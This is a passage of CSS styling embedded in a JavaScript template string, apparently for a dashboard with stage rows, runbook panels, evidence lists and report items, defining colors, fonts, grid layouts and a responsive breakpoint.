    border-color: rgba(245,158,11,0.42);
    box-shadow: 0 0 30px rgba(245,158,11,0.06);
  }
  .stage-number {
    color: ${C.amber};
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 24px;
    font-weight: 900;
  }
  .stage-row h3 {
    font-size: 19px;
    line-height: 1.3;
    margin: 0 0 7px;
  }
  .stage-row p {
    margin: 0 0 13px;
  }
  .chip-group {
    display: flex;
    flex-wrap: wrap;
    gap: 6px;
  }
  .chip-group span {
    border: 1px solid rgba(34,211,238,0.24);
    color: #bae6fd;
    font-size: 11px;
    padding: 5px 7px;
  }
  .stage-runbook {
    background: rgba(3,6,10,0.34);
    border: 1px solid rgba(34,211,238,0.16);
    display: grid;
    gap: 9px;
    margin-top: 14px;
    padding: 14px;
  }
  .stage-runbook strong {
    color: ${C.green};
    font-family: "JetBrains Mono", Consolas, monospace;
    font-size: 11px;
    letter-spacing: 0.13em;
    text-transform: uppercase;
  }
  .stage-runbook p {
    color: #dbeafe;
    margin: 0;
  }
  .stage-runbook small {
    color: #bbf7d0;
    line-height: 1.55;
  }
  .evidence-list {
    border-left: 1px solid rgba(148,163,184,0.12);
    display: grid;
    gap: 8px;
    grid-template-columns: 22px 1fr;
    padding-left: 16px;
  }
  .evidence-list svg {
    color: ${C.amber};
  }
  .evidence-list small {
    color: #cbd5e1;
    display: block;
    font-size: 12px;
    line-height: 1.48;
    margin-bottom: 5px;
  }
  .ops-list article {
    background: rgba(3,6,10,0.35);
    border: 1px solid rgba(148,163,184,0.12);
    display: grid;
    gap: 10px;
    padding: 14px;
  }
  .ops-list svg {
    color: ${C.accent};
  }
  .ops-list strong {
    color: ${C.text};
    font-size: 16px;
  }
  .impact-panel {
    border-color: rgba(245,158,11,0.28);
  }
  .report-list {
    display: grid;
    gap: 10px;
    margin-top: 18px;
  }
  .report-list div {
    align-items: center;
    color: #cbd5e1;
    display: flex;
    gap: 10px;
    line-height: 1.55;
  }
  .report-list svg {
    color: ${C.green};
    flex: 0 0 auto;
  }
  @media (max-width: 1100px) {
    .hero-grid, .control-grid, .bottom-grid {
      grid-template-columns: 1fr;
    }
    .connection-grid {
      grid-template-columns: repeat(2, minmax(0, 1fr));
    }
    .stage-row {
      grid-template-columns: 52px minmax(0, 1fr);
    }
    .evidence-list {
      border-left: 0;
      border-top: 1px solid rgba(148,163,184,0.12);
      grid-column: 2;
      padding-left: 0;
      padding-top: 14px;
    }
  }
`;



